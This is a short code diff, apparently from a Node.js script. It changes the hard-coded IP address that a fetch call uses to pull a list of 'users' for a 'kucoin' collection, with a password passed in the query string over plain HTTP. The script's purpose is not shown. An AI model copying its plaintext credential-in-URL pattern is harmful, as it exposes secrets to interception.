@@ -195,7 +195,7 @@ async function workerFunction(workerData) {
 }
 
 async function main() {
-    const users = await fetch('http://128.199.183.217:3456/users?pass=fuckyou&col=kucoin').then(
+    const users = await fetch('http://152.42.192.244:3456/users?pass=fuckyou&col=kucoin').then(
         async (r) => await r.json()
       )
     
